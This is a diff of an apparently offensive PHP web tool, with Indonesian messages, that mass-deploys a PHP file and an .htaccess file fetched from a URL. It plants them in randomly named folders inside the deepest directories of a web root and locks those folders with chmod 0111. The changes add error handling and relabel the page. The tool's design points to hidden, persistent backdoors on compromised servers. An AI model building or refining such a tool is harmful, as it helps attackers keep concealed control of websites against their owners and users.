@@ -31,25 +31,48 @@ function generateRandomFolderName($base, $used = []) {
     return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
 }
 
-function findLeafFolders($dir) {
+function findLeafFolders($dir, &$errorLog = []) {
     $leafFolders = [];
 
-    $rii = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
+    try {
+        $rii = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+    } catch (UnexpectedValueException $e) {
+        $errorLog[] = "❌ Tidak bisa buka root path: $dir - " . $e->getMessage();
+        return $leafFolders;
+    }
 
     foreach ($rii as $file) {
         if ($file->isDir()) {
-            $sub = glob($file->getPathname() . '/*', GLOB_ONLYDIR);
+            $path = $file->getPathname();
+
+            if (!is_readable($path)) {
+                $errorLog[] = "❌ Folder tidak bisa dibaca: $path (kemungkinan permission atau ownership)";
+                continue;
+            }
+
+            $sub = @glob($path . '/*', GLOB_ONLYDIR);
+            if ($sub === false) {
+                $errorLog[] = "⚠️ Gagal glob folder: $path";
+                continue;
+            }
+
             if (empty($sub)) {
-                $leafFolders[] = $file->getPathname();
+                $leafFolders[] = $path;
             }
         }
     }
 
-    $subRoot = glob($dir . '/*', GLOB_ONLYDIR);
-    if (empty($subRoot)) $leafFolders[] = $dir;
+    if (!is_readable($dir)) {
+        $errorLog[] = "❌ Target path tidak bisa dibaca: $dir";
+    } else {
+        $subRoot = @glob($dir . '/*', GLOB_ONLYDIR);
+        if (is_array($subRoot) && empty($subRoot)) {
+            $leafFolders[] = $dir;
+        }
+    }
 
     return $leafFolders;
 }
@@ -71,7 +94,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!$htaccessContent) $error[] = "❌ Gagal ambil .htaccess dari URL.";
 
         if ($phpContent && $htaccessContent) {
-            $leafFolders = findLeafFolders($target);
+            $leafFolders = findLeafFolders($target, $error);
             $success[] = "📦 Folder buntu ditemukan: " . count($leafFolders);
 
             if (empty($leafFolders)) {
@@ -111,7 +134,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     }
 
                     if (chmod($newFolder, 0111)) {
-                        $success[] = "🔒 Folder dikunci: $newFolder (chmod 0111)";
+                        $success[] = "🔐 Folder dikunci: $newFolder (chmod 0111)";
                     } else {
                         $error[] = "❌ Gagal chmod 0111: $newFolder";
                     }
@@ -135,7 +158,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </style>
 </head>
 <body>
-    <h2>🚀 Mass Deploy ke Leaf Folder</h2>
+    <h2>🚀 Mass Deploy .php + .htaccess ke Leaf Folder</h2>
     <form method="POST">
         <label>📁 Target Path:</label>
         <input type="text" name="target_path" required placeholder="/var/www/html">
